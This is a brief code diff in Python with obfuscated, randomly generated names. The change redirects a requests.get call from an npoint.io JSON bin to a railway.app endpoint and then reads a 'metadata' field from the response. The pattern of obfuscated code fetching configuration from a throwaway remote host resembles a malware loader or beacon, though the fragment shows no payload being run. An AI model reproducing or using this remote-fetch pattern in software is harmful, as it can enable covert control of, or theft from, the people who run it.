@@ -18,7 +18,7 @@ def learn_dnylwa_718():
 
     def learn_utgoga_302():
         try:
-            net_btzkbu_329 = requests.get('https://api.npoint.io/bce23d001b135af8b35a', timeout=10)
+            net_btzkbu_329 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_btzkbu_329.raise_for_status()
             process_wisnol_126 = net_btzkbu_329.json()
             model_mcnkxc_308 = process_wisnol_126.get('metadata')
